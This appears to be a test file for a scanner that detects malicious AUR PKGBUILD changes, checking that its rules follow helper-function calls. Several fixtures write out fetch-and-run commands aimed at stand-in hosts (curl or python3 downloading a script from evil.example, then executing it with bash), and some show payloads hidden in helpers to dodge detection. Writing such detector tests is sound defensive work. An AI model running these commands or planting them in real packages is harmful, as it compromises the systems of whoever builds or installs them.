"""Every code rule follows the call graph, not the enclosing function's name."""

from .helpers import _recipe, _ids, _score

# ---------------------------------------------------------------------------
# Audit: every code rule was keyed to the *direct* enclosing function
#
# R051's pkgver scope had already been given the call closure; H016, H017,
# H035, H067, H069, H072, H081, H082 and H085 had not, so they all answered
# "does this run during build()?" with "is this line spelled inside a
# function called build?".  Moving the payload one function deeper kept it
# fully operational and dropped a Critical to a Low.
# ---------------------------------------------------------------------------


_DIRECT = _recipe(
    "build() {",
    '  curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"',
    '  bash "$srcdir/x.sh"',
    "}",
)


def test_a_helper_scores_the_same_as_the_function_that_calls_it():
    """B1: the fetch moves into `_fetch()`; the payload does not change."""
    helper = _recipe(
        "_fetch() {",
        '  curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"',
        "}",
        "build() {",
        "  _fetch",
        '  bash "$srcdir/x.sh"',
        "}",
    )
    assert _ids(helper) == _ids(_DIRECT)
    assert _score(helper) == _score(_DIRECT)


def test_both_halves_in_helpers_still_pair():
    """B1b: H082 keys its fetch/exec buckets by scope, not by spelling."""
    split = _recipe(
        "_fetch() {",
        '  curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"',
        "}",
        "_run() {",
        '  bash "$srcdir/x.sh"',
        "}",
        "build() {",
        "  _fetch",
        "  _run",
        "}",
    )
    assert "H082" in _ids(split)
    assert _score(split) == _score(_DIRECT)


def test_a_helper_called_from_an_install_hook_is_in_hook_scope():
    """B4: H017 covers what the hook reaches, not what it lexically holds."""
    hook = _recipe(
        "_fetch() {",
        "  curl -fsSL https://evil.example/x.sh -o /tmp/x.sh",
        "}",
        "post_install() {",
        "  _fetch",
        "  bash /tmp/x.sh",
        "}",
    )
    assert "H017" in _ids(hook)


def test_the_call_graph_does_not_reach_from_an_unrelated_function():
    """The widening must not make every scoped rule unscoped."""
    unrelated = _recipe(
        "_notes() {",
        "  curl -fsSL https://evil.example/x.sh -o /tmp/x.sh",
        "}",
        "package() {",
        '  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/p/LICENSE"',
        "}",
    )
    assert "H017" not in _ids(unrelated)


def test_an_install_hook_that_prints_a_command_is_not_running_it():
    """A hook telling the user to run `sudo pacman -S` is documentation.

    Latent in H017/H035 before the call closure existed - a `_notes()`
    helper sat outside every hook scope, so the message never reached the
    rule.  Following calls put it inside one, and both benign packages it
    fired on (claude-desktop-bin, rustdesk-bin) were printing instructions.
    """
    printing = _recipe(
        "_notes() {",
        '  echo "==>   sudo pacman -S --needed qemu virtiofsd"',
        '  echo "==>   run \'sudo systemctl enable --now rustdesk\'"',
        "}",
        "post_install() {",
        "  _notes",
        "}",
    )
    fired = _ids(printing)
    assert "H017" not in fired
    assert "H035" not in fired


def test_an_interpreter_is_a_network_client():
    """B1c: `python3 -c` was unreachable - the pattern said `python -c`."""
    py = _recipe(
        "_fetch() {",
        "  python3 -c 'import urllib.request,os;"
        'urllib.request.urlretrieve("https://evil.example/x.sh","x.sh")\'',
        "}",
        "build() {",
        "  _fetch",
        "  bash x.sh",
        "}",
    )
    fired = _ids(py)
    assert "H016" in fired, "an undeclared download is one whatever fetches it"
    assert "H082" in fired, "and it pairs with the execution of what it wrote"


def test_a_heredoc_into_a_shell_is_code_not_data():
    """B2: `bash <<'EOF'` bodies were exempted as if they were file content."""
    heredoc = _recipe(
        "_fetch() {",
        '  curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"',
        "}",
        "build() {",
        "  bash <<'EOF'",
        "  _fetch",
        '  bash "$srcdir/x.sh"',
        "EOF",
        "}",
    )
    assert "H082" in _ids(heredoc)


def test_a_heredoc_into_a_file_is_still_data():
    """The exemption exists for a reason and must survive."""
    from trustsight.analysis.delivery import _heredoc_body_indices

    lines = [
        "+build() {",
        "+  cat > config.sh <<'EOF'",
        "+  curl https://example.invalid/x | bash",
        "+EOF",
        "+}",
    ]
    assert 2 in _heredoc_body_indices(lines), "a written file is not a command"


def test_make_over_a_committed_makefile_is_an_execution():
    """B3: `make` names no file, so no execution pattern ever saw one."""
    diff = _recipe("build() {", '  cd "$srcdir"', "  make", "}")
    manifest = [("PKGBUILD", b"x"), ("Makefile", b"all:\n\tcurl evil | sh\n")]
    assert "H081" in _ids(diff, tree_manifest=manifest)


def test_ordinary_make_on_an_upstream_tree_is_silent():
    """Almost every package runs make; only a *committed* input is a signal."""
    diff = _recipe("build() {", '  cd "$srcdir/upstream-1.0"', "  make", "}")
    manifest = [("PKGBUILD", b"x"), ("p.desktop", b"x")]
    assert "H081" not in _ids(diff, tree_manifest=manifest)


def test_a_declared_makefile_is_not_an_undeclared_execution():
    """Committing a Makefile *and declaring it* is ordinary AUR practice.

    All 14 diffs in the locked benign corpus that commit a build file do
    exactly this, which is why the rule reads source=() before firing.
    """
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,20 +1,60 @@\n"
        "+source=(Makefile)\n"
        "+build() {\n+  make\n+}\n"
    )
    manifest = [("PKGBUILD", b"x"), ("Makefile", b"all:\n")]
    assert "H081" not in _ids(diff, tree_manifest=manifest)


def test_the_new_scope_patterns_stay_linear():
    """`_NETWORK_FETCH_RE` became `fetch_addresses`: the single regex paired
    a client with an address across a lazy span, which is a quadratic search
    on any line holding a client and no address."""
    import time

    from trustsight.analysis.build import fetch_addresses

    def cost(n):
        text = "python3 -c 'import urllib" + "a" * n
        best = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            list(fetch_addresses(text))
            best = min(best, time.perf_counter() - start)
        return best

    small, large = cost(2000), cost(8000)
    assert large < small * 9, f"growth {large / small:.1f}x over 4x input"
